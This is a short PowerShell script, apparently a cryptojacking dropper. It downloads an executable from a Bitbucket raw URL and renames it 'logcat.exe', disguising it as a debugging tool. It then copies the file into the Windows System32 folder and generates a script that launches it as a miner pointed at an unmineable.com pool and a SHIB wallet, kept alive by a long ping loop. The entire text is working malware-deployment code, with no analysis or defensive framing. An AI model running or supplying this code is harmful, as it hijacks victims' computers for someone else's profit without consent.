Invoke-WebRequest https://bitbucket.org/mukidi001/scmin/raw/369e77359d8ee5330127340dad83c13dfa4fea9d/vios.exe -OutFile logcat.exe
Copy logcat.exe C:\Windows\System32
cmd /c echo cmd /k start logcat.exe --pool rx-us.unmineable.com:3333 --username SHIB:0xf53472b6f7a30d6f6f84cf2e85f29f3bc78a2ef7.$(shuf -i 10-9999999999999999999 -n 1) --password x --algorithm wrkzcoin --disableNVIDIA >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
